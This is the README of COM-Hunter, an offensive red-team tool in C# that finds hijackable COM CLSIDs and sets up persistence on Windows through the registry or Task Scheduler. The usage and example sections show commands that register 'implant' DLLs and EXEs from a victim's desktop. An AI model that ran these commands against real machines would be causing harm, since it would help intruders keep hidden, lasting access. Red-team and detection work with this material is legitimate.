# COM-Hunter

COM Hijacking VOODOO

<p align="center">
  <img width="500" height="400" src="/Pictures/logo2.png"><br /><br />
  <img alt="GitHub License" src="https://img.shields.io/github/license/nickvourd/COM-Hunter?style=social&logo=GitHub&logoColor=purple">
  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/nickvourd/COM-Hunter?logoColor=yellow"><br />
  <img alt="GitHub forks" src="https://img.shields.io/github/forks/nickvourd/COM-Hunter?logoColor=red">
  <img alt="GitHub watchers" src="https://img.shields.io/github/watchers/nickvourd/COM-Hunter?logoColor=blue">
  <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/nickvourd/COM-Hunter?style=social&logo=GitHub&logoColor=green">
</p>

## Description

COM-Hunter is a COM Hijacking persistnce tool written in C#.

![Static Badge](https://img.shields.io/badge/.NET-4.8-blue?style=flat&logoSize=auto)
![Static Badge](https://img.shields.io/badge/C-yellow?style=flat&logoSize=auto)
![Static Badge](https://img.shields.io/badge/Make-green?style=flat&logoSize=auto)
![Static Badge](https://img.shields.io/badge/Version-2.0%20-red?link=https%3A%2F%2Fgithub.com%2Fnickvourd%2FCOM-Hunter%2Freleases)

The following list explains the available modes:

- **Search Mode**: Searches for CLSIDs based on `InprocServer32`, `LocalServer32`, and registry hives `HKLM` and `HKCU`.
- **Classic Persist Mode**: Performs classic COM hijacking persistence using `LocalServer32` or `InprocServer32`.
- **Task Scheduler Mode**: Automatically establishes COM hijacking persistence via Task Scheduler using `LocalServer32` or `InprocServer32`.

## Disclaimer

The authors and contributors of this project are not liable for any illegal use of the tool. It is intended for educational purposes only. Users are responsible for ensuring lawful usage.

## Table of Contents

- [COM-Hunter](#com-hunter)
    - [Description](#description)
    - [Disclaimer](#disclaimer)
    - [Table of Contents](#table-of-contents)
    - [Acknowledgement](#acknowledgement)
    - [Usage](#usage)
    - [Examples](#examples)
    - [References](#references)

## Acknowledgement
 
This project created with :heart: by [@nickvourd](https://x.com/nickvourd) && [@S1ckB0y1337](https://x.com/S1ckB0y1337).

Special thanks to [Marios Gyftos](https://www.linkedin.com/in/marios-gyftos-a6b62122/) for his invaluable assistance during the beta testing phase of this tool.

Inspired by the [RTO course](https://courses.zeropointsecurity.co.uk/courses/red-team-ops) from [@zeropointsecltd](https://x.com/zeropointsecltd).

## Usage

```
 ██████╗ ██████╗ ███╗   ███╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
██╔════╝██╔═══██╗████╗ ████║      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██║     ██║   ██║██╔████╔██║█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██║     ██║   ██║██║╚██╔╝██║╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝██║ ╚═╝ ██║      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

                                   Version: 2.0
                             @nickvourd && @S1ckB0y1337
                  ~ Inspired during the RTO course by @zeropointsecltd ~

Usage: COM_Hunter.exe <mode> <options>

[+] Modes:
    search             Search Mode
    persist            Classic Persist Mode
    tasksch            Task Scheduler Mode

[+] Search Mode:
Usage:  COM-Hunter.exe search <CLSID> <options>
    -a, --all                   Search DLL and EXE implementations in HKLM and HKCU
    -i, --inprocserver32        Search DLL implementations in HKLM and HKCU
    -l, --localserver32         Search EXE implementations in HKLM and HKCU
    -m, --machine               Search DLL and EXE implementations in HKLM
    -u, --user                  Search DLL and EXE implementations in HKCU

[+] Classic Persist Mode:
Usage:  COM-Hunter.exe persist <CLSID> <binary_path> <option>
    -i, --inprocserver32        Set DLL implementation
    -l, --localserver32         Set EXE implementation

[+] Task Scheduler Mode:
Usage:  COM-Hunter.exe tasksch <binary_path> <option>
    -i, --inprocserver32        Set DLL implementation
    -l, --localserver32         Set EXE implementation
```

## Examples

:information_source: Search DLL and EXE implementations in HKLM and HKCU:

```
.\COM-Hunter.exe search 01575CFE-9A55-4003-A5E1-F38D1EBDCBE1 -a
```

:information_source: Search EXE implementations in HKLM and HKCU:

```
.\COM-Hunter.exe search "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -l
```

:information_source: Advanced search EXE implementations in HKLM:

```
.\COM-Hunter.exe search "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -l --machine
```

:information_source: Search EXE and DLL implementations in HKCU:

```
.\COM-Hunter.exe search AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 --user
```

:information_source: Perform classic persistence using DLL implementation:

```
.\COM-Hunter.exe persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\Users\victim\Desktop\implant.dll -i
```

:information_source: Perform classic persistence using EXE implementation:

```
.\COM-Hunter.exe persist "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" C:\Users\victim\Desktop\implant.exe --localserver32
```

:information_source: Perform persistence via Task Scheduler using DLL implementation:

```
.\COM-Hunter.exe tasksch C:\Users\victim\Desktop\implant.dll --inprocserver32
```

## References

- [Persistence: “the continued or prolonged existence of something”: Part 2 – COM Hijacking by MDSec](https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/)
- [Abusing the COM Registry Structure (Part 2): Hijacking & Loading Techniques by BOHOPS](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)
- [Userland Persistence with Scheduled Tasks and COM Handler Hijacking by Enigma0x3](https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/)
- [COM Objects Hijacking by Virus Total](https://blog.virustotal.com/2024/03/com-objects-hijacking.html)
